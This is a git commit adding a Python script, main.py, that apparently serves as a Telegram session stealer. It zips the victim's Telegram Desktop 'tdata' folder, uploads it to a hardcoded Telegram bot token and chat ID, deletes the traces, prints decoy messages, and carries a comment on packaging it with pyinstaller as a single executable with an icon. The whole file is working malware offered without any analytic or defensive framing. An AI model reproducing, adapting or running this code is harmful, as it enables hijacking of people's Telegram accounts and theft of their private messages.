f799e7778c75487037fdd9c9bd043c6f3023431a
Ulug'bek Bolqiboyev <bolqiboyevuz@gmail.com>
2024-08-06 20:40:49 -0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,39 @@
+import os
+import shutil
+import zipfile
+import requests
+import random
+from time import gmtime, strftime
+time = strftime("%Y-%m-%d %H:%M:%S", gmtime())
+try:
+    print("Wait...")
+    print(time)
+    username = os.getlogin()
+    tdata_path = os.path.join(
+        "C:\\Users", username,
+        "AppData", "Roaming", "Telegram Desktop", "tdata"
+    )
+    def zip_folder(folder_path, output_path):
+        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, dirs, files in os.walk(folder_path):
+                # 'user_data' folderni tashlab ketish
+                dirs[:] = [d for d in dirs if d != 'user_data' if d != 'user_data#2']
+                
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    try:
+                        zipf.write(file_path, os.path.relpath(file_path, folder_path))
+                    except:
+                        pass
+    zip_folder(tdata_path,"tdata.zip")
+    res = requests.get(f"https://api.telegram.org/bot7434554949:AAHSukv6qTe0IUqTNkduA-D906TEmxDxNw4/sendDocument?chat_id=7332620755&caption={time}",files={'document':open(f"tdata.zip",'rb')}).json()
+    os.remove("tdata.zip")
+    input("Enter Press click")
+except:
+    print("Hello world!")
+    input()
+
+
+
+
+# pyinstaller.exe --icon=test.ico -F  .\main.py 
